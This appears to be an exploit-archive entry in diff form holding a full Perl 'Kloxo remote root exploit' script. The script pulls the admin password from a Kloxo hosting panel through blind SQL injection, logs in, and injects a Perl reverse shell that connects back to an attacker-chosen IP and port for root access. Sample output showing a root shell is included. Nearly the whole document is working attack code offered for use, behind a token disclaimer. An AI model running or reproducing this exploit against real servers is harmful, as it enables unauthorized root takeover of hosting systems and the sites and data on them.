@@ -1,0 +1,242 @@
+id: 21970
+date: 03/02/2014
+title: Kloxo Remote Root Exploit
+author: Simo Ben
+cves: 
+
+#!/usr/bin/perl
+#
+# Title: Kloxo remote root exploit               
+# Author: Simo Ben youssef
+# Contact: Simo_at_Morxploit_com
+# Coded: 28 January 2014
+# Published: 26 February 2014
+# MorXploit Research
+# http://www.MorXploit.com
+#
+# Download:
+# http://www.morxploit.com/morxploits/morxkloxo.pl
+#
+# Requires LWP::UserAgent
+# apt-get install libwww-perl
+# yum install libwww-perl
+# perl -MCPAN -e 'install Bundle::LWP'
+# For SSL support:
+# apt-get install liblwp-protocol-https-perl
+# yum install perl-Crypt-SSLeay
+#
+# Tested on CentOS 5.8 and 5.9
+# Should work on CentOS/RHEL 5.x
+#
+# Author disclaimer:
+# The information contained in this entire document is for educational, demonstration and testing purposes only.
+# Author cannot be held responsible for any malicious use. Use at your own risk.
+#
+# perl morxkloxo.pl http://******.com:7778 **.**.**.** 31337
+#
+# ===================================================
+# --- Kloxo remote root exploit
+# --- By: Simo Ben youssef <simo_at_morxploit_com>
+# --- MorXploit Research www.MorXploit.com
+# ===================================================
+# [*] MorXploiting http://******.com:7778
+# [*] It might take a little while, so sit your ass down and relax
+# [+] Base64 pwd: bW9yeHBsb2l0
+# [+] Got admin password: morxploit
+# [*] Logging in ...
+# [+] Successfully logged in!
+# [*] Trying to get server info
+# [+] Done!
+# [*] Trying to inject connect back shell
+# [+] Looks good, now waiting for root shell
+# [+] Et voila you are in!
+#
+# Linux ******.com 2.6.18-308.8.2.el5.028stab101.1PAE #1 SMP Sun Jun 24 21:40:20 MSD 2012 i686 i686 i386 GNU/Linux
+# uid=0(root) gid=0(root)
+
+use LWP::UserAgent;
+use IO::Socket;
+use strict;
+use MIME::Base64;
+
+sub banner {
+system('clear');
+print "===================================================\n";
+print "--- Kloxo remote root exploit\n";
+print "--- By: Simo Ben youssef <simo_at_morxploit_com>\n";
+print "--- MorXploit Research www.MorXploit.com\n";
+print "===================================================\n";
+}
+
+if (!defined ($ARGV[0] && $ARGV[1] && $ARGV[2])) {
+banner();
+print "perl $0 <target> <connectbackIP> <connectbackport> <verbose>\n";
+print "perl $0 http://localhost:7778 127.0.0.1 31337\n";
+exit;
+}
+
+my $host = $ARGV[0];
+my $cbhost = $ARGV[1];
+my $cbport = $ARGV[2];
+my $v = $ARGV[3];
+my $pos = "8";
+my $start = "48";
+my $ends = "122";
+my $password;
+my $char;
+my $cookie;
+my $decoded;
+my $class;
+my $lhost;
+$| = 1;
+$SIG{CHLD} = 'IGNORE';
+
+my $l_sock = IO::Socket::INET->new(
+Proto => "tcp",
+LocalPort => "$cbport",
+Listen => 1,
+LocalAddr => "0.0.0.0",
+Reuse => 1,
+) or die "[-] Could not listen on $cbport: $!\n";
+
+my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+$ua->timeout(10);
+
+my $up = $ua->get("$host");
+unless ($up->is_success) {
+print "[-] Error: " . $up->status_line . "\n";
+exit;
+}
+banner();
+print "[*] Verbose mode on!\n" if (defined $v);
+print "[*] MorXploiting $host\n";
+print "[*] It might take a little while, so sit your ass down and relax\n";
+my $check = "lbin/webcommand.php";
+my $kloxo = $ua->get("$host/$check");
+
+unless ($kloxo->decoded_content =~ /__error_only_clients_and_auxiliary_allowed_to_login/) {
+print "[-] Doesn't seem like $host is running kloxo\n";
+exit;
+}
+
+while ($pos) {
+for(my $count=$start;$count<=$ends;$count++) {
+
+if (($count > 57) && ($count < 61) || ($count > 90) && ($count < 97)) {
+next;
+}
+my $query = "lbin/webcommand.php?login-class=client&login-name=a%27%20union%20select%20%27%241%24Tw5.g72.%24/0X4oceEHjGOgJB/fqRww/%27%20from%20client%20where%20ascii%28substring%28%28%20select%20realpass%20from%20client%20limit%201%29%2c$pos%2c1%29%29%3d$count%23&login-password=123456";
+my $page = $ua->get("$host/$query");
+print "\r[*] Trying char/position: $count/$pos" if (defined $v);
+if (($page->is_success) && ($page->decoded_content =~ /^\s*$/)) {
+$char = chr($count);
+$password .= $char;
+print "\n" if (defined $v);
+print "\r[+] Base64 pwd: $password";
+sleep (2) if (defined $v);
+last;
+}
+}
+my $passlength = length($password);
+my $charlength = ($pos - 7);
+if (($passlength < $charlength) && ($passlength != 0)) {
+$decoded = decode_base64($password);
+print "\n[+] Got admin password: $decoded\n";
+last;
+}
+elsif ($passlength == 0) {
+print "\n[-] Failed, probably not vulnerable\n";
+exit;
+}
+$pos++
+}
+
+print "[*] Logging in ...\n";
+my $kloxo = $ua->post("$host/htmllib/phplib/",[ "frm_clientname"=> "admin", "frm_password"=> "$decoded", "login" => "Login" ] );
+
+if ($kloxo->as_string =~ /Set-Cookie: kloxo-session-id=(.*?);/) {
+print "[+] Successfully logged in!\n";
+$cookie = $1;
+}
+else {
+print "[-] Couldn't log in\n";
+exit;
+}
+
+print "[*] Trying to get server info\n";
+my $getinfo = $ua->get("$host/display.php?frm_action=show", 'Cookie' => "kloxo-clientname=admin; kloxo-classname=client; kloxo-session-id=$cookie");
+if ($getinfo->decoded_content =~ /commandcenter">(.*?)">/s) {
+my $pserver = $1;
+$pserver =~ /value =\"(.*)/;
+$class = $1;
+}
+else {
+print "[-] Couldn't get info, trying default settings\n";
+$class = "pserver";
+}
+if ($getinfo->decoded_content =~ /name="frm_o_o\[0\]\[class\]" value ="$class">(.*?)">/s) {
+my $nname = $1;
+$nname =~ /value =\"(.*)/;
+$lhost = $1;
+}
+else {
+print "[-] Couldn't get info, trying default settings\n";
+$lhost = "localhost";
+}
+print "[+] Done!\n";
+
+my $ua2 = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
+$ua2->timeout(10);
+print "[*] Trying to inject connect back shell\n";
+my $inject = $ua2->post("$host/display.php",
+Content_Type => 'form-data',
+Cookie => "kloxo-clientname=admin; kloxo-classname=client; kloxo-session-id=$cookie",
+Content => [
+'frm_o_o[0][class]' => "$class",
+'frm_o_o[0][nname]' => "$lhost",
+'frm_pserver_c_ccenter_command' => "perl -MIO -e '\$p=fork;exit,if(\$p); use Socket; use FileHandle; my \$system = \"/bin/sh\"; my \$host = \"$cbhost\"; my \$port = \"$cbport\";socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\")); connect(SOCKET, sockaddr_in(\$port, inet_aton(\$host))); SOCKET->autoflush(); open(STDIN, \">&SOCKET\"); open(STDOUT,\">&SOCKET\"); open(STDERR,\">&SOCKET\"); print \"[+] Et voila you are in!\\n\\n\"; system(\"uname -a;id\"); system(\$system);'",
+'frm_action' => 'updateform',
+'frm_subaction' => 'commandcenter',
+'frm_change' => 'Execute',
+],
+);
+unless ($inject->as_string =~ /200 OK/) {
+print "[-] Something went wrong\n";
+exit;
+}
+
+print "[+] Looks good, now waiting for root shell\n";
+
+my $a_sock = $l_sock->accept();
+$l_sock->shutdown(SHUT_RDWR);
+copy_data_bidi($a_sock);
+
+sub copy_data_bidi {
+my ($socket) = @_;
+my $child_pid = fork();
+if (! $child_pid) {
+close(STDIN);
+copy_data_mono($socket, *STDOUT);
+$socket->shutdown(SHUT_RD);
+exit();
+} else {
+close(STDOUT);
+copy_data_mono(*STDIN, $socket);
+$socket->shutdown(SHUT_WR);
+kill("TERM", $child_pid);
+}
+}
+sub copy_data_mono {
+my ($src, $dst) = @_;
+my $buf;
+while (my $read_len = sysread($src, $buf, 4096)) {
+my $write_len = $read_len;
+while ($write_len) {
+my $written_len = syswrite($dst, $buf);
+return unless $written_len;
+$write_len -= $written_len;
+}
+}
+}
+
+#  0day.today [2023-03-24]  #
